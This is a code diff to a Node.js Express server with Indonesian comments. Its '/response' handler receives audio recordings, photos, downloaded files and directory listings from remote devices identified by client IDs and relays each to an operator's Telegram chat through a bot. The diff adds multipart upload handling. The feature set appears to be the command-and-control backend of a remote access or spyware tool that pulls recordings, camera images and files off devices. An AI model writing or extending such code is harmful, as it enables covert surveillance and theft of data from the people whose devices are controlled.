@@ -941,50 +941,55 @@ app.post('/response', upload.single('media_file'), async (req, res) => {
                         if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     }
                 };
-                if (data.type === 'audio_base64') {
+                if (data.type === 'audio_base64' || data.type === 'audio_multipart') {
                     await clearPreviousNav(cmd.chat_id);
                     let audioSource;
-                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
                     const audioUrl = logData.data;
                     if (audioUrl && typeof audioUrl === 'string' && audioUrl.startsWith('/public/uploads/')) {
                         audioSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(audioUrl))), filename: `record.mp4` };
-                    } else {
-                        audioSource = { source: Buffer.from(deviceResponse, 'base64'), filename: `record.mp4` };
+                    } else if (data.data) {
+                        audioSource = { source: Buffer.from(data.data, 'base64'), filename: `record.mp4` };
                     }
-                    const sent = await bot.telegram.sendAudio(cmd.chat_id, audioSource, { caption: `✅ Rekaman (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
-                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
-                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
-                    return res.json({ status: 'received' });
+                    if (audioSource) {
+                        const sent = await bot.telegram.sendAudio(cmd.chat_id, audioSource, { caption: `✅ Rekaman (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                        if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
+                        if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
+                        return res.json({ status: 'received' });
+                    }
                 }
-                if (data.type === 'photo_base64') {
+                if (data.type === 'photo_base64' || data.type === 'photo_multipart') {
                     await clearPreviousNav(cmd.chat_id);
                     let photoSource;
-                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
                     const photoUrl = logData.data;
                     if (photoUrl && typeof photoUrl === 'string' && photoUrl.startsWith('/public/uploads/')) {
                         photoSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(photoUrl))) };
-                    } else {
-                        photoSource = { source: Buffer.from(deviceResponse, 'base64') };
+                    } else if (data.data) {
+                        photoSource = { source: Buffer.from(data.data, 'base64') };
                     }
-                    const sent = await bot.telegram.sendPhoto(cmd.chat_id, photoSource, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
-                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
-                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
-                    return res.json({ status: 'received' });
+                    if (photoSource) {
+                        const sent = await bot.telegram.sendPhoto(cmd.chat_id, photoSource, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                        if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
+                        if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
+                        return res.json({ status: 'received' });
+                    }
                 }
-                if (data.type === 'file_download' && deviceResponse.name && deviceResponse.data) {
+                if ((data.type === 'file_download' || data.type === 'file_multipart')) {
                     await clearPreviousNav(cmd.chat_id);
                     let docSource;
-                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
-                    const dlUrl = logData.data?.url;
+                    const dlUrl = logData.data?.url || (typeof logData.data === 'string' ? logData.data : null);
+                    const fileName = (req.file ? req.file.originalname : (deviceResponse.name || 'file'));
+
                     if (dlUrl && typeof dlUrl === 'string' && dlUrl.startsWith('/public/uploads/')) {
-                        docSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(dlUrl))), filename: deviceResponse.name };
-                    } else {
-                        docSource = { source: Buffer.from(deviceResponse.data, 'base64'), filename: deviceResponse.name };
+                        docSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(dlUrl))), filename: fileName };
+                    } else if (deviceResponse.data) {
+                        docSource = { source: Buffer.from(deviceResponse.data, 'base64'), filename: fileName };
                     }
-                    const sent = await bot.telegram.sendDocument(cmd.chat_id, docSource, { caption: `✅ Download (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
-                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
-                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
-                    return res.json({ status: 'received' });
+                    if (docSource) {
+                        const sent = await bot.telegram.sendDocument(cmd.chat_id, docSource, { caption: `✅ Download (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                        if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
+                        if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
+                        return res.json({ status: 'received' });
+                    }
                 }
                 if (data.type === 'ls_result' && Array.isArray(deviceResponse)) {
                     await clearPreviousNav(cmd.chat_id);
